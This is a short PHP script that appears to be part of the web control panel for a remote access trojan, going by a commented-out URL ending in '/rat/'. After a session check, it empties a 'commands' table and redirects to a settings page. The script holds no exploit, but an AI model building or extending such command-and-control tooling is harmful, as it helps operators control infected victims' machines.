<?php
// $url = "http://pizzachip.com/rat/";
include("configg.php");

if (file_exists("config.php")) {
  include("config.php");
} else {
  header('Location: setup/');
}

session_start();
if (empty($_SESSION['code'])) {
  header( 'Location: index.php' ) ;
  die();
}

include("functions.php");

$statement = $connect->prepare("TRUNCATE TABLE commands");
$statement->execute();header('Location: settings.php');

?>
